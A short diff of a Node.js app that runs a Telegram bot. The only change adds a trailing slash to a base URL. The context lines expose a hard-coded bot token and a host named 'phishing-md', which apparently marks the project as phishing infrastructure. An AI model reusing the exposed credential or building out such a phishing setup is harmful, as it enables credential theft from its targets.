@@ -10,7 +10,7 @@ app.use(express.static("public"));
 
 // ===== HARD-CODED BOT INFO =====
 const TOKEN = "8653888099:AAE7kkVarBwcEdMQ7S1ZlrUoLyy9HP86TTU";
-const BASE_URL = "https://phishing-md.onrender.com"; // change this
+const BASE_URL = "https://phishing-md.onrender.com/"; // change this
 
 // ===== BOT =====
 const bot = new TelegramBot(TOKEN, { polling: true });
